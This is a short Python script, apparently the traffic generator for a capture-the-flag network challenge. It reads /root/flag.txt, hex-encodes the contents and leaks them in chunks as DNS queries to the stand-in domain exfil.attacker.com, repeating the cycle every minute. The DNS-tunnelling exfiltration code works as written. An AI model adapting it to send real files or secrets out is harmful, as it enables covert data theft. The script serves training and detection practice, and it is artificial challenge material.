#!/usr/bin/env python3
"""
Simulates DNS-based data exfiltration.
Encodes flag content as subdomain DNS queries to attacker-controlled domain.
"""
import socket
import time
import os

FLAG_FILE = '/root/flag.txt'
EXFIL_DOMAIN = 'exfil.attacker.com'

def exfiltrate_flag():
    try:
        with open(FLAG_FILE) as f:
            flag = f.read().strip()
    except Exception:
        flag = 'flag{net-02-default}'

    print(f"[server] Starting DNS exfiltration simulation for: {flag}")

    # Encode the flag in hex chunks as DNS subdomain queries
    hex_encoded = flag.encode().hex()
    chunk_size = 8  # 8 hex chars per chunk = 4 bytes
    chunks = [hex_encoded[i:i+chunk_size] for i in range(0, len(hex_encoded), chunk_size)]

    while True:
        for i, chunk in enumerate(chunks):
            query = f"{i:02d}-{chunk}.{EXFIL_DOMAIN}"
            print(f"[server] DNS query: {query}")
            try:
                socket.gethostbyname(query)
            except socket.gaierror:
                # Expected to fail (no real DNS server) — the query is what matters
                pass
            time.sleep(1)

        # Total count query
        total_query = f"total-{len(chunks)}.{EXFIL_DOMAIN}"
        try:
            socket.gethostbyname(total_query)
        except socket.gaierror:
            pass

        print(f"[server] Exfiltration cycle complete. Next cycle in 60s...")
        time.sleep(60)

if __name__ == '__main__':
    exfiltrate_flag()
